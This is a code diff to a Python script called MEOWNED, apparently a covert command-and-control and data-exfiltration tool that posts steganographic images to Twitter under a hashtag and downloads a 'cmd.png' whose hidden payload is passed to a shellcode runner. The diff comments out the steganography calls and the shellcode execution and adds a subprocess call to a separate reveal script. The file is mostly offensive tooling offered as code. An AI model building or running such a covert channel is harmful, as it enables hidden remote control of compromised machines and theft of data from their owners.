@@ -1,18 +1,16 @@
 #!/usr/bin/python
-"""MEOWNED (MEssages Over tWitter Exfiltrating Data)"""
+# """MEOWNED (MEssages Over tWitter Exfiltrating Data)"""
 """pip3 install python-twitter"""
-"""pip3 install Stegano"""
-"""pip install pyyaml"""
+"""pip3 install pyyaml"""
 
 import sys
 import yaml
 import twitter
 import urllib
 import re
-from stegano import lsb
-
 import ctypes
 import base64
+from subprocess import check_output
 
 # Import YAML
 with open("conf.yaml", 'r') as stream:
@@ -29,8 +27,8 @@ api = twitter.Api(consumer_key=conf['twitter']['consumer_key'],
 
 def tweet_image(src_image, message):
     # Hide the secret message
-    secret = lsb.hide("./source-imgs/" + src_image, message)
-    secret.save("./output-imgs/" + src_image)
+    # secret = lsb.hide("./source-imgs/" + src_image, message)
+    # secret.save("./output-imgs/" + src_image)
 
     # Post image to Twitter
     status = api.PostMedia( "meow " + "#" + conf['id'], "./output-imgs/" + src_image)
@@ -53,7 +51,8 @@ def verify_api():
 
 def get_secret(image):
     # reveal hidden message in the image
-    clear_message = lsb.reveal("./download/" + image)
+    clear_message = check_output(["python3", "reveal.py", "./download/" + image])
+    print(clear_message)
     return clear_message
 
 def search_hashtag(cc_hastag):
@@ -103,7 +102,7 @@ def process_tweet(tweet):
         print("Downloaded.")
         print("Decrypting hidden message...")
         payload = get_secret("cmd.png")
-        run_shellcode(payload)
+        #run_shellcode(payload)
 def extract_urls():
     return re.search("(?P<url>https?://[^\s]+)", myString).group("url")
 
